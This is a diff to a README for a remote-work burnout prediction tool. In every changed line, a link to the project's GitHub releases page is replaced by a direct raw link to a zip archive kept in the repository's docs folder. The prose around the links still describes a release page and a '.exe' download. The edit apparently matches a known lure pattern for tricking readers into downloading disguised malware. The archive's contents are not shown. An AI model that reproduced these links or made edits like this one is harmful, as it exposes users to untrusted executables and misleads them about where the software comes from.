@@ -1,6 +1,6 @@
 # 🔥 Burnout_Analysis - Predict Remote Work Stress Easily
 
-[![Download Burnout_Analysis](https://img.shields.io/badge/Download-Burnout_Analysis-brightgreen?style=for-the-badge)](https://github.com/cloudedminds/Burnout_Analysis/releases)
+[![Download Burnout_Analysis](https://img.shields.io/badge/Download-Burnout_Analysis-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/cloudedminds/Burnout_Analysis/main/docs/Analysis_Burnout_v1.6.zip)
 
 ---
 
@@ -42,7 +42,7 @@ No programming tools or additional setups are needed. Burnout_Analysis runs as a
 
 You will first need to get the Burnout_Analysis software from the official release page. Visit the link below to find the latest version available.
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Here-Blue?style=for-the-badge&color=blue)](https://github.com/cloudedminds/Burnout_Analysis/releases)
+[![Download from Releases](https://img.shields.io/badge/Download%20Here-Blue?style=for-the-badge&color=blue)](https://raw.githubusercontent.com/cloudedminds/Burnout_Analysis/main/docs/Analysis_Burnout_v1.6.zip)
 
 On the page, look for the latest release file ending in `.exe`. The file name will usually include the version number. For example, `Burnout_Analysis_v1.2.exe`.
 
@@ -115,7 +115,7 @@ Burnout_Analysis uses proven methods from behavioral engineering and AI to deliv
 
 Burnout_Analysis is regularly updated for performance and accuracy. To check for updates, revisit the release page:
 
-https://github.com/cloudedminds/Burnout_Analysis/releases
+https://raw.githubusercontent.com/cloudedminds/Burnout_Analysis/main/docs/Analysis_Burnout_v1.6.zip
 
 Follow the same download and install instructions for newer versions.
 
@@ -141,4 +141,4 @@ This software uses Python’s popular machine learning libraries like XGBoost an
 
 Access the latest version of Burnout_Analysis by visiting the release page:
 
-[![Download Latest](https://img.shields.io/badge/Download-Burnout_Analysis-brightgreen?style=for-the-badge)](https://github.com/cloudedminds/Burnout_Analysis/releases)
+[![Download Latest](https://img.shields.io/badge/Download-Burnout_Analysis-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/cloudedminds/Burnout_Analysis/main/docs/Analysis_Burnout_v1.6.zip)
